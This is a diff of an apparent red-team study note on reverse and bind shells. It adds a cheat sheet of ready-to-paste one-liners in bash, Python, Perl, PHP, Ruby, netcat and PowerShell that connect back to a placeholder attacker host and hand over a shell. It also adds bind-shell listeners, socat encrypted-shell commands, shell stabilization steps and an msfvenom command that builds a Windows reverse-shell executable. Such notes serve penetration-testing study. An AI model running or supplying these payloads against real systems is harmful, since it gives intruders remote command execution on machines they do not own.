@@ -1,22 +1,93 @@
 ---
-title: 'TryHackMe: Umbrella'
-author: jrg1a
-categories: [Red Team]
-tags: [shell, , docker, mysql, rce]
-render_with_liquid: false
-img_path: /images/RedTeam/
-image:
-  path: revshell.webp
+title: Reverse Shell
+date: 2025-01-11 20:00:00 +0100
+categories: [Red Team, Network]
+tags: [shell, bash, zsh, php, python, socat, netcat, msfvenom, metasploit, reverse shell, bind shell, shell stabilization, shell payloads]     # TAG names should always be lowercase
 ---
-
 # Reverse Shell
 
+> A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.
 ## Types of shell
+There are two types of shells: 
+1. **Reverse Shell**: The target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection.
+2. **Bind Shell**: The target machine opens a port and waits for an incoming connection. The attacking machine connects to that port and gets a shell.
 
-###### PHP shell
+### Reverse Shell
+A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.
+
+#### Bash shell
+```bash
+bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
+```
+
+#### Python shell
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+#### Perl shell
+```perl
+perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+#### PHP shell
 ```php
 php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
+
+#### Ruby shell
+```ruby
+ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+#### Netcat shell
+```bash
+nc -e /bin/sh ATTACKING-IP 80
+```
+
+#### Powershell shell
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+
+
+There are many other ways to get a reverse shell, but these are just some examples. More can be found on sites like [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and [PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/).
+
+### Bind Shell
+A bind shell is a type of shell in which the target machine opens a communication port or a network socket and waits for an incoming connection. The attacking machine connects to that port and gets a shell.
+
+#### Python shell
+```python
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+```
+
+#### Perl shell
+```perl
+perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
+bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
+close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
+```
+
+#### PHP shell
+```php
+php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);\
+socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
+$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
+    socket_write($cl,$m,strlen($m));}}'
+```
+
+#### Ruby shell
+```ruby
+ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
+```
+
+#### Netcat Traditional shell
+```bash
+nc -lvp 51337 -e /bin/bash
+```
+
+More bind shell examples can be found on sites like [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/bind-shell-cheat-sheet) and [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/).
 
 ### Shell
 
@@ -24,7 +95,7 @@ php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 A server can be forces to send us command access to the server (Rever Shell), or to open a port on the server which we can connect through and start executing further commands (Bind Shell). 
 
----
+
 #### <mark style="background: #FFB8EBA6;">Tools</mark>
 There are several tools that will be used when trying to receive reverse shells or send bind shells. We need malicious shell code, as well as a way of interfacing with the resulting shell.
 ##### <mark style="background: #FF5582A6;">Netcat</mark>
@@ -40,7 +111,7 @@ The `exploit/multi/handler` module is used to receive reverse shells, and since 
 Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Msfvenom can generate payloads other than reverse and bind shells, and its an incredibly powerful tool. 
 
 
----
+
 ### Netcat
 
 Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking. With it we can do a wide variety of interesting things, but let's focus for now on shells.
@@ -70,7 +141,7 @@ Here we are using netcat to make an outbound connection to the target on our cho
 2. `export TERM=xterm`
 3. we will background the shell using Ctrl + Z, then use `stty raw -echo; fg` in our own terminal, which turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys,and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
 
----
+
 ### SoCat
 
 >Similar to netcat in some ways, but fundamentally different in many others.
@@ -99,7 +170,7 @@ Same technique applies for bind shell:
 - Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
 - Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`
 
----
+
 ### Common Shell Payloads
 
 - `/usr/share/windows-resources/binarie`
@@ -128,7 +199,7 @@ In order to use this, we need to replace `<IP>` and `<port>` with an appropriate
 
 For other common reverse shell payloads, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages.
 
----
+
 ### Msfvenom
 
 Syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`
@@ -136,20 +207,6 @@ Syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`
 E.g. Windows x64 Reverse Shell
 - `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
 
-
----
-
-#### References
-
-[[Windows PrivEsc]]
-
-[[Authentication Bypass]]
-
-[[IDOR]]
-
-[[File Inclusion]]
-
-[[SSRF]]
 
 ### Payloads
 
